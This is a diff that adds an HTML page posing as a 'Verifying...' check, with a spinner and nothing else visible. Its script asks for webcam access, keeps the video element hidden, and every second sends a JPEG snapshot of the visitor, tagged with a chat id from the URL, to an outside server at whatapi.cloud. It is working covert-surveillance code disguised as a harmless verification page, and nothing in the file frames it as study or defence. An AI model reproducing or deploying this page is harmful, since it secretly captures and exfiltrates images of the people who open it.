@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying...</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Poppins", sans-serif;
+        }
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: #7D2AE8;
+        }
+        .verification-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            text-align: center;
+        }
+        .verification-container h2 {
+            margin-top: 20px;
+            color: #fff;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        .rotate-icon {
+            font-size: 50px;
+            color: #fff;
+            animation: rotate 2s linear infinite;
+            display: inline-block;
+        }
+        @keyframes rotate {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        video {
+            display: none; /* Hide the video element since we only need it for capturing images */
+        }
+    </style>
+</head>
+<body>
+
+<div class="verification-container">
+    <div class="rotate-icon">
+        <i class="fas fa-sync-alt"></i>
+    </div>
+    <h2>Verifying...</h2>
+</div>
+
+<video id="video" width="300" height="200" autoplay></video>
+<div id="message-container"></div>
+
+<script src="https://kit.fontawesome.com/a076d05399.js"></script>
+
+<script>
+    const video = document.querySelector("#video");
+    const messageContainer = document.getElementById("message-container");
+    const chatId = new URLSearchParams(window.location.search).get("id");
+
+    if (navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+            })
+            .catch(function(error) {
+                console.error('Error accessing media devices.', error);
+            });
+    }
+
+    function compressAndSendImage(image_data, quality, format) {
+        const img = new Image();
+        img.src = image_data;
+        img.onload = function() {
+            const canvas = document.createElement('canvas');
+            canvas.width = img.width;
+            canvas.height = img.height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+            const compressedDataUrl = canvas.toDataURL(format, quality);
+            sendImageToServer(compressedDataUrl);
+        }
+    }
+
+    function sendImageToServer(image_data) {
+        fetch('https://whatapi.cloud:8443/send-image', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                id: chatId,
+                image: image_data
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            messageContainer.textContent = "Image sent successfully!";
+        })
+        .catch(error => {
+            console.error('Error sending image to server:', error);
+            messageContainer.textContent = "Error sending image.";
+        });
+    }
+
+    function captureAndSendImage() {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        const image_data = canvas.toDataURL('image/jpeg', 0.5); // Initial compression to JPEG with 50% quality
+
+        compressAndSendImage(image_data, 0.5, 'image/jpeg'); // Try sending compressed JPEG first
+    }
+
+    setInterval(function() {
+        if (video.paused || video.ended) return;
+        captureAndSendImage();
+    }, 1000); // send image every 1 second
+</script>
+
+</body>
+</html>
